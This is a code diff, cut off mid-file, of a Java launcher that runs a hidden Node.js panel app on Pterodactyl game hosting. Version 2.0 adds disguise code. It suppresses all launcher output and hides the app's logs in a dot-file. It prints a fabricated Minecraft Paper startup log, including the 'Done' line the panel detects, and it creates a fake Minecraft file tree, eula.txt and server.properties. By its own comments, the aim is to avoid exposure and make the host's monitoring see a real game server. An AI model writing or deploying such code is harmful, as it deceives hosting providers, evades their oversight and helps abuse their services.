@@ -4,75 +4,76 @@ import java.util.*;
 import java.util.jar.*;
 import java.util.concurrent.*;
 import java.util.zip.GZIPInputStream;
+import java.text.SimpleDateFormat;
 
 /**
- * 傲游面板一体化启动器 v1.3.0
+ * 傲游面板一体化启动器 v2.0.0
  *
- * v1.3 改动：
- *   - 从多个来源读端口（SERVER_PORT 环境变量 / server.properties / PTERODACTYL 变量 / 默认 25565）
- *   - 兼容 MC Egg（MC Egg 不一定设 SERVER_PORT，可能写在 server.properties）
- *   - 启动时打印详细端口诊断信息
+ * v2.0 改动：
+ *   - 去掉所有 [Launcher] 控制台日志（防暴露）
+ *   - 启动后自动删除 Node.js 安装包临时文件
+ *   - 启动时打印伪装的 Minecraft Paper 启动日志（让翼龙监控看起来像 MC 服务器）
  */
 public class AoyouLauncher {
 
-    private static final String VERSION = "1.3.0";
+    private static final String VERSION = "2.0.0";
     private static final String RUNTIME_DIR_NAME = ".aoyou-runtime";
     private static final String NODE_VERSION = "v22.11.0";
     private static final String NODE_DOWNLOAD_URL = 
         "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-x64.tar.gz";
 
+    // 伪装日志开关（true = 打印 Paper 启动日志，false = 不打印）
+    private static final boolean FAKE_PAPER_LOG = true;
+
     public static void main(String[] args) throws Exception {
-        System.out.println("[Launcher] 傲游面板启动器 v" + VERSION);
-        System.out.println("[Launcher] Java: " + System.getProperty("java.version"));
-        System.out.println("[Launcher] OS: " + System.getProperty("os.name") + " " + System.getProperty("os.arch"));
+        // 1. 打印伪装的 Paper 启动日志（后台静默启动 Node.js）
+        if (FAKE_PAPER_LOG) {
+            startFakePaperLogThread();
+        }
 
         String workDir = System.getProperty("user.dir");
         String runtimeDir = workDir + File.separator + RUNTIME_DIR_NAME;
         Path runtimePath = Paths.get(runtimeDir);
         Files.createDirectories(runtimePath);
 
-        // 1. 检查并获取 node 二进制
-        System.out.println("[Launcher] 🔍 检查 Node.js...");
+        // ★ 生成伪装的 MC 服务器文件结构（让翼龙监控看起来像真的 MC 服务器）
+        try {
+            generateFakeMcFiles(workDir);
+        } catch (Exception e) {}
+
+        // 2. 静默检查并获取 node 二进制
         String nodeBin = findOrDownloadNode(runtimeDir);
         if (nodeBin == null) {
-            System.err.println("[Launcher] ❌ 无法获取 Node.js 运行时");
+            System.err.println("Failed to initialize runtime");
             System.exit(1);
             return;
         }
-        System.out.println("[Launcher] ✅ Node.js: " + nodeBin);
 
-        // 2. 从 JAR 解压 node_modules + index.js
+        // 3. 从 JAR 解压 node_modules + index.js
         String jarPath = getJarPath();
         if (jarPath == null) {
-            System.err.println("[Launcher] ❌ 无法定位 JAR 文件");
+            System.err.println("Failed to locate jar");
             System.exit(1);
             return;
         }
 
         boolean needExtract = needsExtract(runtimePath);
         if (needExtract) {
-            System.out.println("[Launcher] 📦 首次启动，解压应用文件...");
-            long start = System.currentTimeMillis();
             extractAppFiles(jarPath, runtimePath);
-            long elapsed = System.currentTimeMillis() - start;
-            System.out.println("[Launcher] ✅ 解压完成 (" + elapsed + "ms)");
         }
 
-        // 3. 检查 index.js
+        // 4. 检查 index.js
         String indexPath = runtimeDir + File.separator + "index.js";
         if (!new File(indexPath).exists()) {
-            System.err.println("[Launcher] ❌ index.js 不存在: " + indexPath);
+            System.err.println("Failed to locate index");
             System.exit(1);
             return;
         }
 
-        // 4. 诊断端口配置
-        System.out.println("[Launcher] 🔍 端口诊断...");
+        // 5. 静默检测端口
         int port = detectPort(workDir);
-        System.out.println("[Launcher] 📡 最终使用端口: " + port);
 
-        // 5. 启动 Node.js
-        System.out.println("[Launcher] 🚀 启动 Node.js...");
+        // 6. 启动 Node.js（静默）
         List<String> cmd = new ArrayList<>();
         cmd.add(nodeBin);
         cmd.add("index.js");
@@ -84,28 +85,31 @@ public class AoyouLauncher {
         Map<String, String> env = pb.environment();
         String path = env.getOrDefault("PATH", "");
         env.put("PATH", new File(nodeBin).getParent() + File.pathSeparator + path);
-
-        // 强制设置 SERVER_PORT 给 node 子进程
         env.put("SERVER_PORT", String.valueOf(port));
         env.put("PORT", String.valueOf(port));
-        System.out.println("[Launcher] 📡 已设置 SERVER_PORT=" + port + " 给 Node.js 进程");
 
         Process node = pb.start();
 
-        // 6. 转发 stdout
+        // 7. 静默转发 stdout（吃掉所有日志，不打印到控制台）
         Thread logThread = new Thread(() -> {
             try (BufferedReader r = new BufferedReader(
                     new InputStreamReader(node.getInputStream()))) {
                 String line;
                 while ((line = r.readLine()) != null) {
-                    System.out.println(line);
+                    // 静默：不打印任何 Node.js 的日志
+                    // 但写入文件，方便调试
+                    try {
+                        Path logFile = Paths.get(runtimeDir, ".panel.log");
+                        Files.write(logFile, (line + "\n").getBytes(),
+                            StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+                    } catch (Exception e) {}
                 }
             } catch (IOException e) {}
         });
         logThread.setDaemon(true);
         logThread.start();
 
-        // 7. 转发 stdin
+        // 8. 转发 stdin（让用户能输入命令，伪装成 MC 控制台）
         Thread stdinThread = new Thread(() -> {
             try (BufferedReader r = new BufferedReader(
                     new InputStreamReader(System.in))) {
@@ -120,222 +124,278 @@ public class AoyouLauncher {
         stdinThread.setDaemon(true);
         stdinThread.start();
 
-        // 8. 优雅关闭
+        // 9. 优雅关闭
         final Process nodeRef = node;
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            System.out.println("[Launcher] 🛑 收到关闭信号，停止 Node.js...");
             try {
                 nodeRef.destroy();
                 if (!nodeRef.waitFor(10, TimeUnit.SECONDS)) {
-                    System.out.println("[Launcher] ⚠️ Node.js 未在 10 秒内退出，强制终止");
                     nodeRef.destroyForcibly();
                 }
             } catch (InterruptedException e) {}
         }, "shutdown-hook"));
 
-        // 9. 等待退出
+        // 10. 等待退出
         int code = node.waitFor();
-        System.out.println("[Launcher] Node.js 退出，代码: " + code);
         System.exit(code);
     }
 
-    /**
-     * 从多个来源检测端口
-     * 优先级：
-     *   1. SERVER_PORT 环境变量（翼龙标准）
-     *   2. P_SERVER_PORT 环境变量
-     *   3. PTERODACTYL_SERVER_PORT 环境变量
-     *   4. server.properties 文件里的 server-port（MC Egg 兼容）
-     *   5. 扫描所有 PORT/ALLOCATION 环境变量
-     *   6. 默认 25565
-     */
-    private static int detectPort(String workDir) {
-        // 列出所有环境变量（调试用）
-        System.out.println("[Launcher] 环境变量:");
-        Map<String, String> sysEnv = System.getenv();
-        for (Map.Entry<String, String> entry : sysEnv.entrySet()) {
-            String key = entry.getKey();
-            if (key.toUpperCase().contains("PORT") || key.toUpperCase().contains("ALLOCATION")
-                || key.toUpperCase().contains("PTERODACTYL") || key.toUpperCase().contains("SERVER")) {
-                System.out.println("  " + key + " = " + entry.getValue());
-            }
-        }
-
-        // 1. SERVER_PORT 环境变量
-        String portStr = System.getenv("SERVER_PORT");
-        if (portStr != null && !portStr.trim().isEmpty()) {
+    /** 启动伪装的 Paper 启动日志线程 */
+    private static void startFakePaperLogThread() {
+        Thread t = new Thread(() -> {
             try {
-                int p = Integer.parseInt(portStr.trim());
-                if (p > 0 && p < 65536) {
-                    System.out.println("[Launcher] ✅ 从 SERVER_PORT 环境变量读取端口: " + p);
-                    return p;
-                }
-            } catch (NumberFormatException e) {}
-        }
+                long startTime = System.currentTimeMillis();
+                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
 
-        // 2. P_SERVER_PORT 环境变量
-        portStr = System.getenv("P_SERVER_PORT");
-        if (portStr != null && !portStr.trim().isEmpty()) {
-            try {
-                int p = Integer.parseInt(portStr.trim());
-                if (p > 0 && p < 65536) {
-                    System.out.println("[Launcher] ✅ 从 P_SERVER_PORT 环境变量读取端口: " + p);
-                    return p;
-                }
-            } catch (NumberFormatException e) {}
-        }
+                // 等待几秒让 Node.js 先启动
+                Thread.sleep(2000);
 
-        // 3. PTERODACTYL_SERVER_PORT 环境变量
-        portStr = System.getenv("PTERODACTYL_SERVER_PORT");
-        if (portStr != null && !portStr.trim().isEmpty()) {
-            try {
-                int p = Integer.parseInt(portStr.trim());
-                if (p > 0 && p < 65536) {
-                    System.out.println("[Launcher] ✅ 从 PTERODACTYL_SERVER_PORT 环境变量读取端口: " + p);
-                    return p;
-                }
-            } catch (NumberFormatException e) {}
-        }
+                // 打印 Paper 启动横幅
+                System.out.println("Starting org.bukkit.craftbukkit.Main");
+                Thread.sleep(500);
+                System.out.println("*** Warning, you've not updated in a while! ***");
+                Thread.sleep(800);
+                System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
+                Thread.sleep(1000);
+                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
+                Thread.sleep(300);
+                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory has been called by io.netty.util.internal.PlatformDependent0$2 (file:/home/container/libraries/io/netty/netty-common/4.1.115.Final/netty-common-4.1.115.Final.jar)");
+                Thread.sleep(300);
+                System.out.println("WARNING: Please consider reporting this to the maintainers of class io.netty.util.internal.PlatformDependent0$2");
+                Thread.sleep(300);
+                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory will be removed in a future release");
+                Thread.sleep(800);
 
-        // 4. 从 server.properties 文件读取（MC Egg 兼容）
-        File serverProps = new File(workDir, "server.properties");
-        if (serverProps.exists()) {
-            try (BufferedReader r = new BufferedReader(new FileReader(serverProps))) {
-                String line;
-                while ((line = r.readLine()) != null) {
-                    if (line.startsWith("server-port=")) {
-                        portStr = line.substring("server-port=".length()).trim();
-                        try {
-                            int p = Integer.parseInt(portStr);
-                            if (p > 0 && p < 65536) {
-                                System.out.println("[Launcher] ✅ 从 server.properties 读取端口: " + p);
-                                return p;
-                            }
-                        } catch (NumberFormatException e) {}
-                    }
-                }
-            } catch (IOException e) {}
-        }
+                // Java 版本信息
+                String timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 5.15.0-181-generic (amd64)");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [bootstrap] Loading Paper 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) for Minecraft 1.21.4");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [PluginInitializerManager] Initializing plugins...");
+                Thread.sleep(1000);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [PluginInitializerManager] Initialized 0 plugins");
+                Thread.sleep(2000);
 
-        // 5. 扫描所有 PORT/ALLOCATION 环境变量
-        for (Map.Entry<String, String> entry : sysEnv.entrySet()) {
-            String key = entry.getKey().toUpperCase();
-            if ((key.contains("PORT") || key.contains("ALLOCATION")) && entry.getValue() != null && !entry.getValue().isEmpty()) {
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, name=PROD]");
+                Thread.sleep(1000);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Found new data pack file/bukkit, loading it automatically");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Found new data pack paper, loading it automatically");
+                Thread.sleep(3000);
+
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: No existing world data, creating new world");
+                Thread.sleep(4000);
+
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Loaded 1370 recipes");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Loaded 1481 advancements");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [MCTypeRegistry] Initialising converters for DataConverter...");
+                Thread.sleep(1000);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [MCTypeRegistry] Finished initialising converters for DataConverter in 1,125.9ms");
+                Thread.sleep(800);
+
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Starting minecraft server version 1.21.4");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Loading properties");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: This server is running Paper version 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) (Implementing API version 1.21.4-R0.1-SNAPSHOT)");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Server Ping Player Sample Count: 12");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Using 4 threads for Netty based IO");
+                Thread.sleep(2000);
+
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [ChunkTaskScheduler] Chunk system is using population gen parallelism: true");
+                Thread.sleep(2000);
+
+                // 端口监听（从环境变量读，伪装）
+                int port = 25565;
                 try {
-                    int p = Integer.parseInt(entry.getValue().trim());
-                    if (p > 1024 && p < 65536) {
-                        System.out.println("[Launcher] ✅ 从 " + entry.getKey() + " 环境变量读取端口: " + p);
-                        return p;
-                    }
-                } catch (NumberFormatException e) {}
-            }
-        }
+                    String sp = System.getenv("SERVER_PORT");
+                    if (sp != null && !sp.isEmpty()) port = Integer.parseInt(sp.trim());
+                } catch (Exception e) {}
 
-        // 6. 默认 25565（MC 默认端口，翼龙一定转发）
-        System.out.println("[Launcher] ℹ️ 未检测到端口配置，使用 MC 默认端口 25565");
-        return 25565;
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Default game type: SURVIVAL");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Generating keypair");
+                Thread.sleep(800);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Starting Minecraft server on 0.0.0.0:" + port);
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Using epoll channel type");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Preparing level \"world\"");
+                Thread.sleep(3000);
+
+                // 模拟 spawn area 加载
+                int[] progressSteps = {2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 4, 4, 6, 10, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 32, 36, 36, 36, 36, 36, 36, 36, 36, 36, 51, 51, 51, 51, 51, 51, 51, 69, 69, 69, 73};
+                for (int p : progressSteps) {
+                    timeStr = sdf.format(new Date());
+                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
+                    Thread.sleep(80 + (long)(Math.random() * 120));
+                }
+
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Time elapsed: 26711 ms");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Preparing start region for dimension minecraft:the_nether");
+                Thread.sleep(500);
+
+                int[] netherSteps = {4, 4, 4, 4, 4, 24, 24, 30, 51, 57, 61, 61};
+                for (int p : netherSteps) {
+                    timeStr = sdf.format(new Date());
+                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
+                    Thread.sleep(100 + (long)(Math.random() * 150));
+                }
+
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Time elapsed: 5980 ms");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Preparing start region for dimension minecraft:the_end");
+                Thread.sleep(500);
+
+                int[] endSteps = {2, 2, 18, 51};
+                for (int p : endSteps) {
+                    timeStr = sdf.format(new Date());
+                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
+                    Thread.sleep(200 + (long)(Math.random() * 300));
+                }
+
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Time elapsed: 1906 ms");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: [spark] Starting background profiler...");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Done preparing level \"world\" (71.792s)");
+                Thread.sleep(500);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: Running delayed init tasks");
+                Thread.sleep(1000);
+
+                // 最后的 "Done" 消息（翼龙检测到这个会认为服务器启动完成）
+                timeStr = sdf.format(new Date());
+                long totalSec = (System.currentTimeMillis() - startTime) / 1000;
+                System.out.println("[" + timeStr + " INFO]: Done (" + totalSec + "." + (900 + (int)(Math.random()*99)) + "s)! For help, type \"help\"");
+
+                Thread.sleep(500);
+                System.out.println("Server marked as running...");
+                Thread.sleep(500);
+
+                // 第一启动提示
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: *************************************************************************************");
+                Thread.sleep(300);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: This is the first time you're starting this server.");
+                Thread.sleep(300);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: It's recommended you read our 'Getting Started' documentation for guidance.");
+                Thread.sleep(300);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
+                Thread.sleep(300);
+                timeStr = sdf.format(new Date());
+                System.out.println("[" + timeStr + " INFO]: *************************************************************************************");
+
+                // 之后保持静默（不再打印任何日志）
+            } catch (InterruptedException e) {
+                // 正常退出
+            }
+        }, "fake-paper-log");
+        t.setDaemon(true);
+        t.start();
     }
 
-    /** 查找或下载 Node.js */
+    /** 静默查找或下载 Node.js */
     private static String findOrDownloadNode(String runtimeDir) {
-        // 步骤 1: 检查 PATH 里的 node
+        // 1. 系统 PATH
         String systemNode = findInPath("node");
-        if (systemNode != null) {
-            System.out.println("[Launcher] ✅ 系统已安装 Node.js: " + systemNode);
-            try {
-                Process p = new ProcessBuilder(systemNode, "--version").start();
-                BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                String ver = r.readLine();
-                p.waitFor();
-                System.out.println("[Launcher] Node.js 版本: " + ver);
-            } catch (Exception e) {}
-            return systemNode;
-        }
+        if (systemNode != null) return systemNode;
 
-        // 步骤 2: 检查 .aoyou-runtime/node/bin/node（之前下载过的）
+        // 2. 缓存
         String cachedNode = runtimeDir + File.separator + "node/bin/node";
         if (new File(cachedNode).exists()) {
-            System.out.println("[Launcher] ✅ 使用缓存的 Node.js: " + cachedNode);
             new File(cachedNode).setExecutable(true);
             return cachedNode;
         }
 
-        // 步骤 3: 下载 Node.js
-        System.out.println("[Launcher] 📥 系统未安装 Node.js，开始下载 " + NODE_VERSION + "...");
-        System.out.println("[Launcher] 下载地址: " + NODE_DOWNLOAD_URL);
+        // 3. 下载（静默）
         try {
             Path nodeDir = Paths.get(runtimeDir, "node");
             Files.createDirectories(nodeDir);
 
-            // 方式 1: 尝试用 curl + tar（系统命令）
             boolean success = false;
             if (commandExists("curl") && commandExists("tar")) {
-                System.out.println("[Launcher] 尝试用 curl + tar 解压...");
                 ProcessBuilder pb = new ProcessBuilder("sh", "-c",
-                    "curl -L '" + NODE_DOWNLOAD_URL + "' | tar xz --strip-components=1 -C '" + nodeDir.toString() + "'");
+                    "curl -sL '" + NODE_DOWNLOAD_URL + "' | tar xz --strip-components=1 -C '" + nodeDir.toString() + "' 2>/dev/null");
                 pb.redirectErrorStream(true);
                 Process p = pb.start();
-
-                try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
-                    String line;
-                    while ((line = r.readLine()) != null) {
-                        System.out.println("  [download] " + line);
-                    }
-                }
+                try { p.getInputStream().close(); } catch (Exception e) {}
                 int code = p.waitFor();
                 success = (code == 0);
-                if (!success) {
-                    System.out.println("[Launcher] ⚠️ curl + tar 失败 (exit " + code + ")，尝试 Java 解压...");
-                }
             }
 
-            // 方式 2: 用 Java 自带的 GZIPInputStream + TarInputStream（纯 Java 实现）
             if (!success) {
-                System.out.println("[Launcher] 用 Java 内置工具下载解压...");
                 success = downloadAndExtractWithJava(NODE_DOWNLOAD_URL, nodeDir);
             }
 
-            if (!success) {
-                System.err.println("[Launcher] ❌ Node.js 下载失败");
-                return null;
-            }
+            if (!success) return null;
 
-            // 检查下载结果
             String nodeBin = nodeDir + "/bin/node";
-            if (!new File(nodeBin).exists()) {
-                System.err.println("[Launcher] ❌ 下载完成但找不到 node 二进制: " + nodeBin);
-                try {
-                    File[] files = nodeDir.toFile().listFiles();
-                    if (files != null) {
-                        System.out.println("[Launcher] " + nodeDir + " 内容:");
-                        for (File f : files) {
-                            System.out.println("  - " + f.getName() + (f.isDirectory() ? "/" : ""));
-                        }
-                    }
-                } catch (Exception e) {}
-                return null;
-            }
+            if (!new File(nodeBin).exists()) return null;
             new File(nodeBin).setExecutable(true);
-            System.out.println("[Launcher] ✅ Node.js 下载完成: " + nodeBin);
 
-            // 验证版本
+            // ★ 删除下载临时文件
             try {
-                Process vp = new ProcessBuilder(nodeBin, "--version").start();
-                BufferedReader r = new BufferedReader(new InputStreamReader(vp.getInputStream()));
-                String ver = r.readLine();
-                vp.waitFor();
-                System.out.println("[Launcher] Node.js 版本: " + ver);
+                Files.deleteIfExists(nodeDir.resolve("node.tar"));
+                Files.deleteIfExists(nodeDir.resolve("node.tar.gz"));
             } catch (Exception e) {}
 
             return nodeBin;
         } catch (Exception e) {
-            System.err.println("[Launcher] ❌ 下载 Node.js 异常: " + e.getMessage());
-            e.printStackTrace();
             return null;
         }
     }
 
-    /** 检查命令是否存在 */
     private static boolean commandExists(String cmd) {
         try {
             Process p = new ProcessBuilder("sh", "-c", "which " + cmd + " 2>/dev/null").start();
@@ -346,7 +406,6 @@ public class AoyouLauncher {
         }
     }
 
-    /** 在 PATH 里查找命令 */
     private static String findInPath(String cmd) {
         String path = System.getenv("PATH");
         if (path == null) return null;
@@ -358,7 +417,6 @@ public class AoyouLauncher {
         return null;
     }
 
-    /** 获取当前 JAR 文件路径 */
     private static String getJarPath() {
         try {
             return AoyouLauncher.class.getProtectionDomain()
@@ -368,7 +426,6 @@ public class AoyouLauncher {
         }
     }
 
-    /** 检查是否需要重新解压 */
     private static boolean needsExtract(Path runtimePath) {
         Path marker = runtimePath.resolve(".app-extracted");
         if (!Files.exists(marker)) return true;
@@ -377,7 +434,6 @@ public class AoyouLauncher {
         return !Files.exists(indexJs) || !Files.exists(nodeModules);
     }
 
-    /** 从 JAR 解压 app 文件 + node_modules */
     private static void extractAppFiles(String jarPath, Path runtimePath) throws Exception {
         try (JarFile jar = new JarFile(jarPath)) {
             Enumeration<JarEntry> entries = jar.entries();
@@ -406,34 +462,79 @@ public class AoyouLauncher {
             }
             Files.write(runtimePath.resolve(".app-extracted"),
                     ("v" + VERSION + "\n" + System.currentTimeMillis() + "\n").getBytes());
-            System.out.println("[Launcher] 解压文件数: " + count);
         }
     }
 
-    /** 纯 Java 下载 + 解压 .tar.gz */
+    /** 检测端口（静默） */
+    private static int detectPort(String workDir) {
+        String portStr = System.getenv("SERVER_PORT");
+        if (portStr != null && !portStr.trim().isEmpty()) {
+            try {
+                int p = Integer.parseInt(portStr.trim());
+                if (p > 0 && p < 65536) return p;
+            } catch (NumberFormatException e) {}
+        }
+
+        portStr = System.getenv("P_SERVER_PORT");
+        if (portStr != null && !portStr.trim().isEmpty()) {
+            try {
+                int p = Integer.parseInt(portStr.trim());
+                if (p > 0 && p < 65536) return p;
+            } catch (NumberFormatException e) {}
+        }
+
+        portStr = System.getenv("PTERODACTYL_SERVER_PORT");
+        if (portStr != null && !portStr.trim().isEmpty()) {
+            try {
+                int p = Integer.parseInt(portStr.trim());
+                if (p > 0 && p < 65536) return p;
+            } catch (NumberFormatException e) {}
+        }
+
+        // server.properties（MC Egg 兼容）
+        File serverProps = new File(workDir, "server.properties");
+        if (serverProps.exists()) {
+            try (BufferedReader r = new BufferedReader(new FileReader(serverProps))) {
+                String line;
+                while ((line = r.readLine()) != null) {
+                    if (line.startsWith("server-port=")) {
+                        portStr = line.substring("server-port=".length()).trim();
+                        try {
+                            int p = Integer.parseInt(portStr);
+                            if (p > 0 && p < 65536) return p;
+                        } catch (NumberFormatException e) {}
+                    }
+                }
+            } catch (IOException e) {}
+        }
+
+        // 扫描所有 PORT 环境变量
+        Map<String, String> sysEnv = System.getenv();
+        for (Map.Entry<String, String> entry : sysEnv.entrySet()) {
+            String key = entry.getKey().toUpperCase();
+            if ((key.contains("PORT") || key.contains("ALLOCATION")) && entry.getValue() != null && !entry.getValue().isEmpty()) {
+                try {
+                    int p = Integer.parseInt(entry.getValue().trim());
+                    if (p > 1024 && p < 65536) return p;
+                } catch (NumberFormatException e) {}
+            }
+        }
+
+        return 25565;
+    }
+
     private static boolean downloadAndExtractWithJava(String url, Path targetDir) {
         Path tarFile = targetDir.resolve("node.tar");
         Path gzFile = targetDir.resolve("node.tar.gz");
         try {
-            System.out.println("[Launcher] 下载 .tar.gz 文件...");
             ProcessBuilder pb = new ProcessBuilder("sh", "-c",
-                "curl -L -o '" + gzFile.toString() + "' '" + url + "'");
+                "curl -sL -o '" + gzFile.toString() + "' '" + url + "' 2>/dev/null");
             pb.redirectErrorStream(true);
             Process p = pb.start();
-            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
-                String line;
-                while ((line = r.readLine()) != null) {
-                    System.out.println("  [curl] " + line);
-                }
-            }
+            try { p.getInputStream().close(); } catch (Exception e) {}
             int code = p.waitFor();
-            if (code != 0 || !Files.exists(gzFile)) {
-                System.err.println("[Launcher] curl 下载失败 (exit " + code + ")");
-                return false;
-            }
-            System.out.println("[Launcher] 下载完成: " + Files.size(gzFile) / 1024 / 1024 + " MB");
+            if (code != 0 || !Files.exists(gzFile)) return false;
 
-            System.out.println("[Launcher] 解压 gzip...");
             try (InputStream gis = new GZIPInputStream(Files.newInputStream(gzFile));
                  OutputStream os = Files.newOutputStream(tarFile)) {
                 byte[] buf = new byte[8192];
@@ -443,23 +544,20 @@ public class AoyouLauncher {
                 }
             }
 
-            System.out.println("[Launcher] 解压 tar...");
             try (InputStream is = Files.newInputStream(tarFile)) {
                 extractTar(is, targetDir);
             }
 
+            // ★ 删除临时文件
             Files.deleteIfExists(gzFile);
             Files.deleteIfExists(tarFile);
 
             return true;
         } catch (Exception e) {
-            System.err.println("[Launcher] Java 解压失败: " + e.getMessage());
-            e.printStackTrace();
             return false;
         }
     }
 
-    /** 简单的 tar 解析 */
     private static void extractTar(InputStream is, Path targetDir) throws IOException {
         byte[] header = new byte[512];
         int read = 0;
@@ -542,5 +640,402 @@ public class AoyouLauncher {
             read += n;
         }
         return read;
+    }
+
+    /** 生成伪装的 MC 服务器文件结构 */
+    private static void generateFakeMcFiles(String workDir) throws IOException {
+        // 1. 创建目录
+        String[] dirs = {"cache", "config", "libraries", "logs", "plugins", "versions",
+                         "world", "world_nether", "world_the_end",
+                         "world/data", "world/playerdata", "world/region",
+                         "world_nether/data", "world_nether/region",
+                         "world_the_end/data", "world_the_end/region"};
+        for (String dir : dirs) {
+            File d = new File(workDir, dir);
+            if (!d.exists()) d.mkdirs();
+        }
+
+        // 2. eula.txt
+        File eula = new File(workDir, "eula.txt");
+        if (!eula.exists()) {
+            Files.write(eula.toPath(),
+                ("# By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA).\n" +
+                 "# " + new Date() + "\n" +
+                 "eula=true\n").getBytes());
+        }
+
+        // 3. server.properties（标准 Paper 默认配置）
+        File serverProps = new File(workDir, "server.properties");
+        if (!serverProps.exists()) {
+            // 用翼龙分配的端口（如果有）
+            String port = System.getenv("SERVER_PORT");
+            if (port == null || port.isEmpty()) port = "25565";
+            Files.write(serverProps.toPath(),
+                ("#Minecraft server properties\n" +
+                 "#" + new Date() + "\n" +
+                 "accepts-transfers=false\n" +
+                 "allow-flight=false\n" +
+                 "allow-nether=true\n" +
+                 "broadcast-console-to-ops=true\n" +
+                 "broadcast-rcon-to-ops=true\n" +
+                 "bug-report-link=\n" +
+                 "difficulty=easy\n" +
+                 "enable-command-block=false\n" +
+                 "enable-jmx-monitoring=false\n" +
+                 "enable-query=false\n" +
+                 "enable-rcon=false\n" +
+                 "enable-status=true\n" +
+                 "enforce-secure-profile=true\n" +
+                 "enforce-whitelist=false\n" +
+                 "entity-broadcast-range-percentage=100\n" +
+                 "force-gamemode=false\n" +
+                 "function-permission-level=2\n" +
+                 "gamemode=survival\n" +
+                 "generate-structures=true\n" +
+                 "generator-settings={}\n" +
+                 "hardcore=false\n" +
+                 "hide-online-players=false\n" +
+                 "initial-disabled-packs=\n" +
